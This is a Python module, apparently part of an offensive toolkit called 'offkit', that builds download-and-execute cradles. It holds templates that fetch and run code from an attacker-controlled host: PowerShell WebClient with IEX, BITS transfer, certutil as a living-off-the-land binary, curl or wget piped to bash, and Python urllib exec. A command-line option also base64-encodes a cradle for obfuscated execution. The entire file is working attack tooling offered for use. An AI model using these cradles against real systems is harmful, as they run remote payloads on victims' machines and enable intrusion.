"""
payload — download / execute cradles
"""

from __future__ import annotations

DESCRIPTION = "download-and-execute cradles"

import argparse
import base64
import sys

CRADLES = {
    "ps_download_iex": {
        "os": "windows",
        "desc": "PowerShell WebClient + IEX",
        "template": "IEX (New-Object Net.WebClient).DownloadString('http://{LHOST}:{LPORT}/{FILE}')",
    },
    "ps_download_iex_proxy": {
        "os": "windows",
        "desc": "PowerShell with default proxy creds",
        "template": (
            "$wc=New-Object Net.WebClient;$wc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;"
            "IEX $wc.DownloadString('http://{LHOST}:{LPORT}/{FILE}')"
        ),
    },
    "ps_bits": {
        "os": "windows",
        "desc": "BITS transfer + execute",
        "template": (
            "Start-BitsTransfer -Source http://{LHOST}:{LPORT}/{FILE} -Destination $env:TEMP\\{FILE};"
            "& $env:TEMP\\{FILE}"
        ),
    },
    "bash_curl": {
        "os": "linux",
        "desc": "curl | bash",
        "template": "curl -s http://{LHOST}:{LPORT}/{FILE} | bash",
    },
    "bash_wget": {
        "os": "linux",
        "desc": "wget | bash",
        "template": "wget -qO- http://{LHOST}:{LPORT}/{FILE} | bash",
    },
    "python_urllib": {
        "os": "cross",
        "desc": "python3 urllib exec",
        "template": (
            "python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://{LHOST}:{LPORT}/{FILE}').read())\""
        ),
    },
    "certutil": {
        "os": "windows",
        "desc": "certutil download (LOLBin)",
        "template": (
            "certutil -urlcache -split -f http://{LHOST}:{LPORT}/{FILE} %TEMP%\\{FILE} & %TEMP%\\{FILE}"
        ),
    },
}


def list_cradles() -> None:
    print("[*] cradles\n")
    for key, c in CRADLES.items():
        print(f"  {key:25} [{c['os']:8}] {c['desc']}")
    print()


def run(argv: list[str]) -> None:
    p = argparse.ArgumentParser(prog="offkit payload", description=DESCRIPTION)
    p.add_argument("--list", "-l", action="store_true")
    p.add_argument("--cradle", "-c")
    p.add_argument("--lhost", "-H")
    p.add_argument("--lport", "-p", type=int, default=80)
    p.add_argument("--file", "-f", default="payload.ps1")
    p.add_argument("--encode", action="store_true")
    args = p.parse_args(argv)

    if args.list or not args.cradle:
        list_cradles()
        return

    if args.cradle not in CRADLES:
        print(f"[!] unknown cradle: {args.cradle}")
        list_cradles()
        sys.exit(1)

    if not args.lhost:
        print("[!] --lhost required")
        sys.exit(1)

    payload = CRADLES[args.cradle]["template"].format(
        LHOST=args.lhost, LPORT=args.lport, FILE=args.file
    )
    print(f"\n[*] {args.cradle} — {CRADLES[args.cradle]['desc']}")
    print("-" * 60)
    if args.encode:
        b64 = base64.b64encode(payload.encode()).decode()
        print(f"echo {b64} | base64 -d | bash")
        print()
    print(payload)
    print("-" * 60)
